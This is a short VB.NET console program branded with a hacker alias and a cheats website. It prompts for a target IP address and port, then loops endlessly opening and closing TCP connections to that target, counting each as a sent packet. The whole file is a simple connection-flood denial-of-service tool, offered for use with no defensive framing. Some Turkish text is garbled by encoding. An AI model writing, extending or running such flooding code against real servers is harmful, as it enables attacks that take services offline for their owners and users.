Imports System.Net
Imports System.Net.Sockets
Module Program

    Sub Main()

        Console.ForegroundColor = ConsoleColor.Red
        Console.Title = "Dev.by Sertcocuk87 "
        Console.WriteLine(" [www.sertcocuk87.org] ")
        Console.ForegroundColor = ConsoleColor.DarkGray
        Console.WriteLine("================================================================================")
        Console.WriteLine(" ==> { www.hubcheats.com } <= ")
        Console.WriteLine(" ==> { S�r�m : 1.0 } <== ")
        Console.WriteLine("================================================================================")
        Console.ForegroundColor = ConsoleColor.Green
        Console.WriteLine("Web @ �p : ")
        Dim ip As String = Console.ReadLine
        Console.WriteLine("Port (Def 80) :")
        Dim porta As Integer = Console.ReadLine
        Dim x As Integer
        Do
            Try
                Dim iep As IPEndPoint
                iep = New IPEndPoint(IPAddress.Parse(ip), Convert.ToInt32(porta))
                Dim s As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                s.Connect(iep)
                s.Close()
                x += 1

                Console.WriteLine("G�nderilen Paket: " & x)
            Catch ex As Exception
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine("G�nderilen Paket: " & x)
            End Try
        Loop
    End Sub
End Module